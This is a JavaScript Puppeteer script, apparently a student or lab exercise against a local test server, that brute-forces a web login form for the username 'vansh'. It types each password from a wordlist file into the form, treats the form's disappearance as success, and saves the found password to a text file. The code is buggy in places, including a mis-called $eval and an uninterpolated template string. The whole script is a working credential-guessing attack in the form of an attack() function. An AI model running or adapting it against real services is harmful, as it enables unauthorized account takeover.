const puppeteer = require('puppeteer');

const url2 = "http://localhost:3000/";
var found = false;
var curr_pass;
async function givePage() {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    return page;
}

async function buttonClick(page, className) {
    try {
        await page.click("button[class='" + className + "']", elem => elem.click());
    } catch (err) {
        try {
            await page.$eval("button[class='" + className + "']", elem => elem.click());
        } catch (err2) {
            await page.evaluate(() => document.getElementsByClassName(className)[0].click());
        }
    }
}

async function inputClick(page, className) {
    try {
        await page.click("input[class='" + className + "']", elem => elem.click());
    } catch (err) {
        console.log(err)
        try {
            await page.$eval("input[class='" + className + "']", elem => elem.click());
        } catch (err2) {
            await page.evaluate(() => document.getElementsByClassName(className)[0].click());
        }

    }
}

async function divClick(page, className) {
    try {
        await page.click("div[class='" + className + "']", elem => elem.click());
    } catch (err) {
        try {
            await page.$eval("div[class='" + className + "']", elem => elem.click());
        } catch (err2) {
            await page.evaluate(() => document.getElementsByClassName(className)[0].click());
        }

    }
}

async function login(page, text, username) {
    await page.goto(url2);
    try {
        await page.waitForSelector("input[class='name']");
    } catch (er) {
        found = true;
    }
    if (!found) {

        await page.type("input[class='name']", username);
       

        await page.waitForSelector("input[class='password']");

        await page.type("input[class='password']", text);
        console.log("here6")

        const waitForSelectorPromise = page.waitForSelector("button[class='submit']");
        // const buttonPromise = buttonClick(page, 'submit');

        const timeout = setTimeout(() => {
            console.log("Timeout reached.");
            found = true
            return
        }, 1000); 

        try {
            await waitForSelectorPromise;
            clearTimeout(timeout);

        } catch (error) {
            console.error("An error occurred:", error);
        }
        try {

            var element = await page.$eval("div[class='home']");
            console.log("here9")

            var value = await page.evaluate(el => el.textContent, element);
            var result = JSON.stringify(value);
            console.log(result);
            try {
                if (result.localeCompare("home") == 0) {
                    console.log("error");
                }
            }
            catch (e) {
                console.log("wrong password, couldnt navigate");
            }

        } catch (err) {
            if (text.length > 6) {
            } else {
                console.log('Password Length is smaller than 6');
            }
        }
        curr_pass = text;
    } else {
        console.log("Correct Password: " + curr_pass);
        const fs = require('fs')
        let data = "Username: ${username}; Password: " + curr_pass;
        fs.writeFile('correct_password.txt', data, (err) => {
            if (err) throw err;
        })
        console.log(curr_pass)
    }

}

async function read(page, username) {
    const nReadlines = require('n-readlines');
    const broadbandLines = new nReadlines('english.txt');
    let line;
    let lineNumber = 1;
    while (line = broadbandLines.next()) {
        if (!found) {
            console.log(`Line ${lineNumber} has: ${line.toString('ascii')}`);
            lineNumber++;
            try {
                await login(page, line.toString('ascii'), username);
            } catch (e) {
                // console.log("Found")
                // const fs = require('fs')
                // let data = "Username: " + username + "; Password: " + curr_pass;
                // fs.writeFile('correct_password.txt', data, (err) => {
                //     if (err) throw err;
                // })
                return line.toString('ascii')
            }

        } else {
            console.log("Found")
            console.log("Correct Password: " + curr_pass);
            const fs = require('fs')
            let data = "Username: "+username+"; Password: " + curr_pass;
            fs.writeFile('correct_password.txt', data, (err) => {
                if (err) throw err;
            })
            break;
        }
    }
    console.log(curr_pass)
    return curr_pass
}

async function attack(username) {
    var page = await givePage();
    var res = await read(page, username);
    // console.log(res)
    return res;
}

attack("vansh")